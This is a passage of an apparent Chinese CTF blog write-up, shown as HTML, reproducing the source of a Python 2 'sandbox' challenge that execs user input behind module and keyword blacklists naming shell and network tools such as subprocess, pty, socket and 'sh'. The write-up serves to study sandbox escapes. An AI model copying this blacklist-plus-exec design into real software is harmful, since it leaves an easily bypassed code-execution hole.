class="string">'new'</span>,</span><br><span class="line">            <span class="string">'optparse'</span>, <span class="string">'pdb'</span>, <span class="string">'pipes'</span>, <span class="string">'pkgutil'</span>, <span class="string">'platform'</span>, <span class="string">'popen2'</span>, <span class="string">'poplib'</span>,</span><br><span class="line">            <span class="string">'posix'</span>, <span class="string">'posixfile'</span>, <span class="string">'profile'</span>, <span class="string">'pstats'</span>, <span class="string">'pty'</span>, <span class="string">'py_compile'</span>,</span><br><span class="line">            <span class="string">'pyclbr'</span>, <span class="string">'pydoc'</span>, <span class="string">'rexec'</span>, <span class="string">'runpy'</span>, <span class="string">'shlex'</span>, <span class="string">'shutil'</span>, <span class="string">'SimpleHTTPServer'</span>,</span><br><span class="line">            <span class="string">'SimpleXMLRPCServer'</span>, <span class="string">'site'</span>, <span class="string">'smtpd'</span>, <span class="string">'socket'</span>, <span class="string">'SocketServer'</span>,</span><br><span class="line">            <span class="string">'subprocess'</span>, <span class="string">'sysconfig'</span>, <span class="string">'tabnanny'</span>, <span class="string">'tarfile'</span>, <span class="string">'telnetlib'</span>,</span><br><span class="line">            <span class="string">'tempfile'</span>, <span class="string">'Tix'</span>, <span class="string">'trace'</span>, <span class="string">'turtle'</span>, <span class="string">'urllib'</span>, <span class="string">'urllib2'</span>,</span><br><span class="line">            <span class="string">'user'</span>, <span class="string">'uu'</span>, <span class="string">'webbrowser'</span>, <span class="string">'whichdb'</span>, <span class="string">'zipfile'</span>, <span class="string">'zipimport'</span>]</span><br><span class="line">    <span class="keyword">for</span> forbid <span class="keyword">in</span> module_blacklist:</span><br><span class="line">        <span class="keyword">if</span> name == forbid:        <span class="comment"># don't let user import these modules</span></span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">'No you can\' import &#123;0&#125;!!!'</span>.format(forbid))</span><br><span class="line">    <span class="keyword">return</span> __import__(name, *args, **kwargs)    <span class="comment"># normal modules can be imported</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sandbox_filter</span><span class="params">(command)</span>:</span></span><br><span class="line">    blacklist = [<span class="string">'exec'</span>, <span class="string">'sh'</span>, <span class="string">'__getitem__'</span>, <span class="string">'__setitem__'</span>, <span class="string">'='</span>, <span class="string">'open'</span>, <span class="string">'read'</span>, <span class="string">'sys'</span>, <span class="string">';'</span>, <span class="string">'os'</span>]</span><br><span class="line">    <span class="keyword">for</span> forbid <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> forbid <span class="keyword">in</span> command:   <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sandbox_exec</span><span class="params">(command)</span>:</span>      <span class="comment"># sandbox user input</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    __sandboxed_builtins__ = dict(__builtins__.__dict__)</span><br><span class="line">    __sandboxed_builtins__[<span class="string">'__import__'</span>] = _hook_import_    <span class="comment"># hook import</span></span><br><span class="line">    <span class="keyword">del</span> __sandboxed_builtins__[<span class="string">'open'</span>]</span><br><span class="line">    _global = &#123;</span><br><span class="line">        <span class="string">'__builtins__'</span> : __sandboxed_builtins__</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> sandbox_filter(command) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Malicious user input detected!!!'</span></span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    command = <span class="string">'result = '</span> + command</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">exec</span> command <span class="keyword">in</span> _global     <span class="comment"># do calculate in a sandboxed environment</span></span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">print</span> e</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    result = _global[<span class="string">'result'</span>]  <span class="comment"># extract the result</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">banner()</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    command = getexp()</span><br><span class="line">    <span class="keyword">print</span> sandbox_exec(command)</span><br></pre></td></tr></table></figure>
+
+<p>和做题时猜想的一直，它自己构造了一个有限制的<code>__builtins__</code>变量，导致很多模块和相应的属性不能访问</p>
+
+  </div>
+</article>
+
+<div id="paginator">
+  
+</div>
+
+      </div>
+    </div>
+    
+<footer class="footer">
+    <div id="bottom-inner">
+      &copy; Conan
+      
+        <span>2016</span> &mdash;
+      
+      <span>2019</span>
+    </div>
+</footer>
+
+  </div>
+
+  
+    
+      <script src="/js/hello.js"></script>
+    
+  
+
+  
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-35288944-1"></script>
+<script>
+  var host = window.location.hostname;
+  if (host != "localhost" || host != "127.0.0.1") {
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-35288944-1');
+  }
+</script>
+
+
+
+</body>
+</html>
